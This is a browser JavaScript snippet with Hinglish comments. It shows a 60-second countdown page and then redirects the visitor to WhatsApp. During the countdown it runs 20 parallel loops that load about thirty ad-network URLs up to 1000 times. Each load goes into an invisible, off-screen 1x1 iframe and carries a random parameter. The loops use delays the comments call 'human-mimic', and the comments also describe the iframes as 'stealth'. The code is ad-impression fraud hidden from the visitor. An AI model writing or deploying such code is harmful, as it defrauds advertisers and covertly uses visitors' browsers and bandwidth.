(function(w, d) {
    "use strict";

    // Private scope: Iske variables bahar kabhi leak nahi honge
    const _V = [
        "https://www.effectivegatecpm.com/wem43a9fuz?key=c740de57b59023c948d2ca88199fa0a7","https://www.effectivegatecpm.com/gbgp14pkk0?key=bcb67ada445075af2996a14ff824aaae","https://www.effectivegatecpm.com/ycxvjgad?key=36f040245e0cf217e3527f25924168c6","https://www.effectivegatecpm.com/r63wuex0?key=54bf02f132e607b8f84b9f0f52e46098","https://www.effectivegatecpm.com/abu6kcc2?key=fc9bf3d320310a51dfbac565c2f91598","https://www.effectivegatecpm.com/ks6nt2ta?key=d4ac0fb9e7336290e2d2d6a771aa3087","https://www.effectivegatecpm.com/rtbq0mkt3?key=f4a554c622400dcdcb8a903b727ce4a5","https://www.effectivegatecpm.com/wqpk9vnp?key=32f8c0024acf715b88404ec135833f05","https://www.effectivegatecpm.com/eb9m6wfu?key=e0f1c26dbb816d4b5da19b38834fd06b","https://www.effectivegatecpm.com/krwgvpbze9?key=ce73cd789369f89a95ff5213331077a8","https://www.effectivegatecpm.com/weja0bbhde?key=18f15d0d6da9ead46bfd22ba5da8b59b","https://www.effectivegatecpm.com/rtex9s8528?key=62f61a972f2701143e7ccc2fa2cb1f85","https://www.effectivegatecpm.com/ztzrq811?key=89066245485d9341000d856d800e8141","https://www.effectivegatecpm.com/pqm04y0b?key=916d5244a2e5affe8a43de62538b2120","https://www.effectivegatecpm.com/j4a3p6r5?key=7ffdf379dbb0a5ae9acadf724e76ed94","https://www.effectivegatecpm.com/jdk38wbq?key=281ec019dea0eb5050dc7390a7824f0f","https://www.effectivegatecpm.com/fgaerzpfm?key=f0621b7d92baf5a452b5e63820980a50","https://www.effectivegatecpm.com/zk2zxni0b?key=9a957b3daa0250d1fd7d86cc64e045ab","https://www.effectivegatecpm.com/j9yhwft25?key=3cb70a400d5d5b4b20d2081a491509f6","https://www.effectivegatecpm.com/bpkstgca?key=3a645d36a30a8d805276a2e648ccc994","https://www.effectivegatecpm.com/ditxc2mmeb?key=9023bcc69763c47a0b56c214e21d82ed","https://www.effectivegatecpm.com/cp5th23hc?key=5fed7497060557b3965db661bf7b9ec7","https://www.effectivegatecpm.com/pu99f9mm1?key=c73f37c6c2032b0564c1aac1541ce1a5","https://www.effectivegatecpm.com/v2tx075f?key=09d4cecd1f20039158c83bc322fdce36","https://www.effectivegatecpm.com/kaswma3q?key=bd0f1d1219437addbb30e173b6063815","https://www.effectivegatecpm.com/m3ezyjk0a?key=3e3d03227fb9591d77cf56f7cd2d7dd0","https://www.effectivegatecpm.com/erqnsya1?key=416ecc4633fb9589ccb2395f4ff964f8","https://www.effectivegatecpm.com/mayn3dfd?key=ba75c6d45a0d4d5ee9fcd21f4337653b","https://www.effectivegatecpm.com/c73t6x3h?key=a570269863e7472b131b4a855dd998dc","https://www.effectivegatecpm.com/zcthz51hv4?key=c26c1d38fa29713c72e72a858f549a9d"
    ];

    let _c = 0;
    const _G = 1000;

    // Isolate function in Global Window
    w['startImmortalEngine'] = function() {
        d.getElementById('sc-1').style.display = 'none';
        d.getElementById('sc-2').style.display = 'block';

        let t = 60;
        const iv = setInterval(() => {
            t--;
            const e = d.getElementById('timer');
            if(e) e.innerText = t;
            if(t <= 0) {
                clearInterval(iv);
                w.location.replace("https://api.whatsapp.com/send?phone=YOUR_NUMBER&v=" + Date.now());
            }
        }, 1000);

        // HYPER-THREADING: 20 Parallel Streams (Absolute Max for Browsers)
        for(let i=0; i<20; i++) {
            setTimeout(_run, i * 85);
        }
    };

    async function _run() {
        while(_c < _G) {
            try {
                const f = d.createElement('iframe');
                // Off-screen stealth rendering
                f.style.cssText = "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;";
                
                const s = Math.random().toString(36).substring(2, 9);
                const b = _V[Math.floor(Math.random() * _V.length)];
                
                f.src = `${b}&ua=${s}&ref=${Date.now()}`;
                d.body.appendChild(f);
                _c++;

                // Human-Mimic Delay (200ms - 450ms)
                await new Promise(res => setTimeout(res, Math.floor(Math.random() * 250) + 200));
                
                // Mandatory Memory Cleanup
                if(f.parentNode) f.parentNode.removeChild(f);
                
                // Anti-Lag Pause
                if(_c % 35 === 0) await new Promise(res => setTimeout(res, 500));

            } catch(err) { _c++; }
        }
    }
})(window, document);
